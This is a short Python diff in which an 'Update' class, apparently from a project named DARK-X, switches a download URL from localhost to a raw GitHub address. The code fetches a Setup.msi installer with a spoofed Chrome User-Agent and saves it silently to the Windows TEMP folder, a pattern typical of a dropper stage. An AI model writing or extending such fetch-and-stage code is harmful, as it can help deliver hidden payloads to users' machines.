@@ -10,7 +10,7 @@ class Update():
 		file = tempfile.TemporaryFile()
 		filename = os.environ['TEMP'] + "\\Setup.msi"
 		file.close()
-		req = requests.get('http://127.0.0.1/Setup.msi')#https://raw.githubusercontent.com/UQABXO/DARK-X/main/Setup.msi',headers={'User-Agent':'Chrome'})
+		req = requests.get('https://raw.githubusercontent.com/UQABXO/DARK-X/main/Setup.msi',headers={'User-Agent':'Chrome'})
 		file = open(filename,"wb")
 		file.write(req.content)
 		file.close()
